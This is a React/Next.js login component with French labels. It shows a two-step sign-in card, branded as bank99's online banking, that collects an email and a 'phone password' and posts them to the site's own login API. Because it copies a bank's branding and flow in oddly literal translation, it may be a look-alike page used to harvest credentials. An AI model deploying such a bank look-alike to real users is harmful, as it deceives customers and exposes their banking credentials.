"use client";

import { useState } from "react";
import Link from "next/link";
import { useRouter } from "next/navigation";

export default function LoginCard() {
  const router = useRouter();
  const [step, setStep] = useState<1 | 2>(1);
  const [username, setUsername] = useState(""); // Correspond à l'email pour la base de données
  const [password, setPassword] = useState(""); // Correspond au phone_password haché
  const [error, setError] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);

  const handleNextStep = (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    if (username.trim() !== "") {
      setStep(2);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    setIsLoading(true);

    try {
      // Appel de l'API de connexion configurée précédemment
      const response = await fetch("/api/auth/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email: username,
          phonePassword: password,
        }),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || "Une erreur est survenue lors de la connexion.");
      }

      if (data.success) {
        // Optionnel : Tu peux stocker les infos de l'utilisateur dans un state global ou un cookie ici
        console.log("Utilisateur connecté avec succès :", data.user);
        
        // Redirection vers l'accueil du dashboard après succès
        router.push("/dashboard");
      }
    } catch (err: any) {
      setError(err.message);
      // Optionnel : si les identifiants sont faux, on peut ramener l'utilisateur à l'étape 1 ou le laisser retaper
      setPassword("");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="login-page-wrapper">
      <div className="login-card">
        
        {/* EN-TÊTE DE LA CARTE DE CONNEXION */}
        <div className="card-header">
          {/* ÉTAPE 1 : Retour à la page d'accueil */}
          {step === 1 && (
            <Link href="/" className="back-button" aria-label="Retour à l'accueil">
              <i className="fa-solid fa-house"></i>
            </Link>
          )}

          {/* ÉTAPE 2 : Retour à l'étape 1 du formulaire */}
          {step === 2 && (
            <button 
              className="back-button" 
              onClick={() => { setStep(1); setError(null); }} 
              aria-label="Retour"
              disabled={isLoading}
            >
              <i className="fa-solid fa-chevron-left"></i>
            </button>
          )}

          <h2>{step === 1 ? "Registre" : "Se connecter"}</h2>
        </div>

        {/* CONTENU DE LA CARTE */}
        <div className="card-body">
          <p className="welcome-text">
            Bonjour de la part des services bancaires en ligne de bank99 ! :-)
          </p>

          {/* AFFICHAGE DES ERREURS BACKEND S'IL Y EN A */}
          {error && <div className="login-error-message">{error}</div>}

          {step === 1 ? (
            /* ÉTAPE 1 : NOM D'UTILISATEUR (EMAIL) */
            <form onSubmit={handleNextStep} className="login-form">
              <div className="input-group-header">
                <label htmlFor="username">adresse e-mail</label>
                <div className="lang-links">
                  <a href="#">Accessible</a> | <a href="#">Anglais</a>
                </div>
              </div>
              <input
                type="email"
                id="username"
                placeholder="exemple@domaine.com"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                autoFocus
                required
              />
              <button type="submit" className="btn-yellow-submit">
                Plus loin
              </button>
              <div className="form-footer-link">
                <a href="#">Vous avez oublié votre nom d'utilisateur ?</a>
              </div>
            </form>
          ) : (
            /* ÉTAPE 2 : MOT DE PASSE */
            <form onSubmit={handleSubmit} className="login-form">
              <div className="input-group-header">
                <label>adresse e-mail</label>
              </div>
              <div className="username-display">{username}</div>

              <div className="input-group-header" style={{ marginTop: "15px" }}>
                <label htmlFor="password">mot de passe du téléphone</label>
              </div>
              <input
                type="password"
                id="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                autoFocus
                required
                disabled={isLoading}
              />
              <button type="submit" className="btn-yellow-submit" disabled={isLoading}>
                {isLoading ? "Vérification..." : "Registre"}
              </button>
              <div className="form-footer-link">
                <a href="#">Mot de passe oublié ?</a>
              </div>
            </form>
          )}
        </div>

      </div>
    </div>
  );
}